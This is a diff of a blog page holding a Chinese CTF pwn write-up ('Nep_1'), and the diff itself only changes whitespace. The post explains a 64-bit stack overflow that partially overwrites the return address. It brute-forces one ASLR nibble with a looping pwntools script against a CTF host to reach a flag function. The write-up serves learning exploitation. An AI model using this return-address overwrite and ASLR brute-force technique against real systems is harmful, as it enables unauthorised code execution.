@@ -20,12 +20,12 @@
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Muse","version":"8.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
-<meta name="description" content="程序开启了随机地址保护——但随机地址不包括低三位的地址     v4用于接收我们的输入数据，能存放8个字节 sub_10D0猜测是read函数，因为语法还有对应的汇编代码极其相似 所以输入8个字节的数据覆盖v4，在输入8个字节覆盖 保存的ebp（因为程序是64位，所以ebp为8个字节），接下来就可以返回地址覆盖上所需跳转的地址。   这里是想要跳转到底地址，可以输出flag的函数。 但程序开启了A">
+<meta name="description" content="程序开启了随机地址保护——但随机地址不包括低三位的地址   v4用于接收我们的输入数据，能存放8个字节 sub_10D0猜测是read函数，因为语法还有对应的汇编代码极其相似 所以输入8个字节的数据覆盖v4，在输入8个字节覆盖 保存的ebp（因为程序是64位，所以ebp为8个字节），接下来就可以返回地址覆盖上所需跳转的地址。  这里是想要跳转到底地址，可以输出flag的函数。 但程">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Nep_1">
 <meta property="og:url" content="http://example.com/2021/03/24/Nep-1/index.html">
 <meta property="og:site_name" content="划水骗分二十年，没人比我更懂蒻">
-<meta property="og:description" content="程序开启了随机地址保护——但随机地址不包括低三位的地址     v4用于接收我们的输入数据，能存放8个字节 sub_10D0猜测是read函数，因为语法还有对应的汇编代码极其相似 所以输入8个字节的数据覆盖v4，在输入8个字节覆盖 保存的ebp（因为程序是64位，所以ebp为8个字节），接下来就可以返回地址覆盖上所需跳转的地址。   这里是想要跳转到底地址，可以输出flag的函数。 但程序开启了A">
+<meta property="og:description" content="程序开启了随机地址保护——但随机地址不包括低三位的地址   v4用于接收我们的输入数据，能存放8个字节 sub_10D0猜测是read函数，因为语法还有对应的汇编代码极其相似 所以输入8个字节的数据覆盖v4，在输入8个字节覆盖 保存的ebp（因为程序是64位，所以ebp为8个字节），接下来就可以返回地址覆盖上所需跳转的地址。  这里是想要跳转到底地址，可以输出flag的函数。 但程">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/2021/03/24/Nep-1/3.png">
 <meta property="og:image" content="http://example.com/2021/03/24/Nep-1/2.png">
@@ -217,19 +217,16 @@
     <div class="post-body" itemprop="articleBody">
         <p>程序开启了随机地址保护——<strong>但随机地址不包括低三位的地址</strong></p>
 <img src="/2021/03/24/Nep-1/3.png" class>
-
 <img src="/2021/03/24/Nep-1/2.png" class>
-
 <p>v4用于接收我们的输入数据，能存放8个字节</p>
 <p>sub_10D0猜测是read函数，因为语法还有对应的汇编代码极其相似</p>
 <p>所以输入8个字节的数据覆盖v4，在输入8个字节覆盖 保存的ebp（因为程序是64位，所以ebp为8个字节），接下来就可以返回地址覆盖上所需跳转的地址。</p>
 <img src="/2021/03/24/Nep-1/1.png" class>
-
 <p>这里是想要跳转到底地址，可以输出flag的函数。</p>
 <p>但程序开启了ASLR，除了低3位的地址以外其余全是扯淡，所以记录下这个函数的开头的第三位地址，但整个程序的的地址也才4位，所以可以随机选一个第四位地址，多次打击，欧拉欧拉欧拉欧拉欧拉欧拉欧拉欧拉欧拉欧拉欧拉欧拉欧拉欧拉，1/16的概率能打中。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">	io = remote(<span class="string">&quot;node2.hackingfor.fun&quot;</span>,<span class="number">36058</span>)</span><br><span class="line">	io.send(<span class="string">&quot;a&quot;</span>*<span class="number">16</span>+p16(<span class="number">0x64e1</span>))</span><br><span class="line">	res = io.recvall()</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&quot;&#123;&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span> res</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>p64()—-8个字节<br>p32()—-4个字节<br>p16()—-2个字节</p>
+<p>p64()----8个字节 p32()----4个字节<br>
+p16()----2个字节</p>
 <p>为什么要用p16()不知道，猜测和程序的栈溢出保护有关。</p>
 
     </div>
